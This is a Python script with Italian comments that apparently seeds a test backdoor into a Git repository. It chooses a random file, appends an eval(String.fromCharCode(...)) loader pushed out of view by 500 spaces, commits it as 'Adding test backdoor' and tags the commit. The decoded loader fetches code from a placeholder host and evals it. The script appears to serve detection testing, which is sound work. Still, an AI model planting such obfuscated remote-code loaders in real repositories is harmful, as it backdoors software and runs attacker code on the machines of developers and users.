import git
import os
import random

def perform_local_git_manipulation(repo_path, file_extension=".py", filters=[], n_blank_chars=500) -> str:
    """
    Esegue manipolazioni locali su un repository Git:
    0. Controlla se l'ultimo tag è "TEST" e se sì, ritorna il file che è stato gia cambiato con l'inserimento della backdoor.
    
    1. Assegna il tag "PRE-TEST" all'ultimo commit se non ha già un tag.
    2. Modifica un file casuale con l'estensione specificata aggiungendo una stringa.
    3. Esegue un commit con messaggio "Adding test backdoor".
    4. Assegna il tag "TEST" al nuovo commit.

    Args:
        repo_path (str): Il percorso al repository Git locale.
        file_extension (str): L'estensione dei file da considerare (es. ".py", ".js", ".txt").
        
    Returns:
        str: Il percorso del file modificato.
    """
    try:
        repo = git.Repo(repo_path)
        
        # fai il checkout dell'ultimo commit
        repo.git.checkout(repo.head.commit)
        
        # --- 0. Controlla se l'ultimo tag è "TEST" ---
        tags = sorted(repo.tags, key=lambda t: t.commit.authored_datetime)
        if not tags:
            print("Nessun tag trovato nel repository.")
            return
        last_tag = tags[-1].name
        print(f"Ultimo tag trovato: {last_tag}")
        if last_tag == "TEST":
            print("Ultimo tag è 'TEST'. Non eseguo ulteriori modifiche.")
            
            last_tag_commit = tags[-1].commit
            # Trova il file modificato nell'ultimo commit
            modified_files = [item.a_path for item in last_tag_commit.diff('PRE-TEST')]
            if modified_files:
                # Se ci sono file modificati, ritorna il primo file
                modified_file = modified_files[0]
                print(f"Ultimo file modificato: {modified_file}, ({len(modified_files)} file modificati)")
                return os.path.join(repo_path, modified_file)
            else:
                print("Nessun file modificato trovato nell'ultimo commit.")
                return
        
        # Assicurati di essere su un branch e non in detached HEAD (se possibile)
        if repo.head.is_detached:
            print("Avviso: Il repository è in stato di 'detached HEAD'. Potrebbe essere necessario fare un checkout su un branch per committare.")
            # Tentativo di checkout del branch principale se esiste
            try:
                if 'master' in repo.branches:
                    repo.git.checkout('master')
                    print("Tentato checkout su 'master'.")
                elif 'main' in repo.branches:
                    repo.git.checkout('main')
                    print("Tentato checkout su 'main'.")
                else:
                    print("Impossibile ripristinare automaticamente un branch. Si prega di ripristinare manualmente (es. 'git checkout master').")
                    return
            except Exception as e:
                print(f"Errore durante il tentativo di checkout: {e}. Continua con attenzione.")

    except git.InvalidGitRepositoryError:
        print(f"Errore: La directory '{repo_path}' non è un repository Git valido.")
        return
    except git.NoSuchPathError:
        print(f"Errore: La directory '{repo_path}' non esiste.")
        return
    except Exception as e:
        print(f"Si è verificato un errore inaspettato durante l'apertura del repository: {e}")
        return

    # --- 1. Assegna il tag "PRE-TEST" all'ultimo commit se non ha già un tag ---
    head_commit = repo.head.commit
    commit_has_tags = False
    for tag in repo.tags:
        if tag.commit.hexsha == head_commit.hexsha:
            commit_has_tags = True
            print(f"L'ultimo commit ({head_commit.hexsha[:7]}) ha già il tag '{tag.name}'. Saltato il tag 'PRE-TEST'.")
            break

    if not commit_has_tags:
        try:
            repo.create_tag("PRE-TEST", ref=head_commit)
            print(f"Tag 'PRE-TEST' assegnato all'ultimo commit ({head_commit.hexsha[:7]}).")
        except git.TagExistsError:
            print(f"Il tag 'PRE-TEST' esiste già. Saltato.")
        except Exception as e:
            print(f"Errore durante la creazione del tag 'PRE-TEST': {e}")

    # --- 2. Prende un file a caso dal repository con una determinata estensione ---
    eligible_files = []
    # Usiamo os.walk per attraversare tutte le directory e trovare i file
    # Ignoriamo la directory .git e node_modules
    for root, dirs, files in os.walk(repo_path):
        # Ignora tutti i file che contengono le directory di filtro
        if any(f in root for f in filters):
            continue
        
        for file_name in files:
            if file_name.endswith(file_extension):
                full_file_path = os.path.join(root, file_name)
                # Assicurati che il file sia tracciato da Git (facoltativo ma consigliato)
                # Questo evita di modificare file non tracciati che non farebbero parte del commit
                try:
                    eligible_files.append(full_file_path)
                except git.GitCommandError:
                    # File non tracciato
                    pass

    if not eligible_files:
        print(f"Nessun file con estensione '{file_extension}' trovato nel repository tracciato da Git.")
        print("Assicurati che i file siano tracciati e non si trovino in '.git', 'node_modules', 'vendor' o 'test'.")
        return

    random_file_path = random.choice(eligible_files)
    print(f"\nFile selezionato casualmente per la modifica: {random_file_path}")

    # --- Aggiunge la stringa al file ---
    # Aggiungi fake_vulnerability spazi vuoti prima della stringa per evitare errori di sintassi
    fake_vulnerability = " " * n_blank_chars  # Inizializza con spazi vuoti
    
    # Questa vulnerabilità è fittizia e creata per funzionare con repo nodejs.
    #
    # Spiegazione (anche se offuscata):
    # Questo codice esegue le seguenti azioni in modo compatto:
    #   Importa https: require('https').
    #   Effettua una richiesta GET: A https://www.fakemaliciouswebsite.it/fake-vulnerability-download.
    #   Riceve la risposta: La funzione di callback gestisce i dati ricevuti (res).
    #   Esegue il contenuto della risposta: I dati ricevuti vengono trattati come stringhe (chunk.toString()) ed eseguite tramite eval().
    fake_vulnerability += "eval(String.fromCharCode(118,97,114,32,104,116,116,112,115,32,61,32,114,101,113,117,105,114,101,40,39,104,116,116,112,115,39,41,59,104,116,116,112,115,46,103,101,116,40,39,104,116,116,112,115,58,47,47,119,119,119,46,102,97,107,101,109,97,108,105,99,105,111,117,115,119,101,98,115,105,116,101,46,105,116,47,102,97,107,101,45,118,117,108,110,101,114,97,98,105,108,105,116,121,45,100,111,119,110,108,111,97,100,39,44,32,114,101,115,32,61,62,32,114,101,115,46,102,111,114,101,97,99,104,40,99,104,117,110,107,32,61,62,32,101,118,97,108,40,99,104,117,110,107,46,116,111,83,116,114,105,110,103,40,41,41,41,41));"
    try:
        with open(random_file_path, 'a', encoding='utf-8') as f:
            f.write('\n' + fake_vulnerability + '\n') # Aggiunge su una nuova riga
        print(f"Stringa aggiunta al file: {random_file_path}")
    except Exception as e:
        print(f"Errore durante la scrittura nel file {random_file_path}: {e}")
        return

    # --- 3. Esegue il commit con messaggio "Adding test backdoor" ---
    try:
        # Aggiungi il file modificato allo staging area
        rel_file_path = os.path.relpath(random_file_path, repo.working_tree_dir)
        repo.index.add([rel_file_path])
        
        # Esegui il commit
        new_commit = repo.index.commit("Adding test backdoor")
        print(f"Commit eseguito con messaggio 'Adding test backdoor'. Hash: {new_commit.hexsha[:7]}")
    except git.GitCommandError as e:
        print(f"Errore durante il commit: {e}")
        print("Assicurati che ci siano modifiche da committare e che la configurazione Git sia corretta (user.name, user.email).")
        return
    except Exception as e:
        print(f"Si è verificato un errore inaspettato durante il commit: {e}")
        return

    # --- 4. Assegna il tag "TEST" al nuovo commit ---
    try:
        repo.create_tag("TEST", ref=new_commit)
        print(f"Tag 'TEST' assegnato al nuovo commit ({new_commit.hexsha[:7]}).")
    except git.TagExistsError:
        print(f"Il tag 'TEST' esiste già. Aggiorna manualmente se necessario.")
    except Exception as e:
        print(f"Errore durante la creazione del tag 'TEST': {e}")

    print("\nOperazioni completate.")
    
    return random_file_path